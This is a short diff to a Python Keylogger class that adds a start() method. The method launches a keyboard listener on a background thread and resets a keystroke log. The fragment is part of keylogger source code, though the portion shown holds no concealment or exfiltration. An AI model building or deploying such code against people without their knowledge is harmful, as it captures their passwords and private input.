@@ -24,3 +24,10 @@ class Keylogger:
         with keyboard.Listener(on_press=self._on_press) as listener:
             self._listener = listener
             listener.join()
+
+    def start(self) -> None:
+        if not self.is_listening:
+            self.is_listening = True
+            self.log = ""
+            self._thread = threading.Thread(target=self._start_listener)
+            self._thread.start()
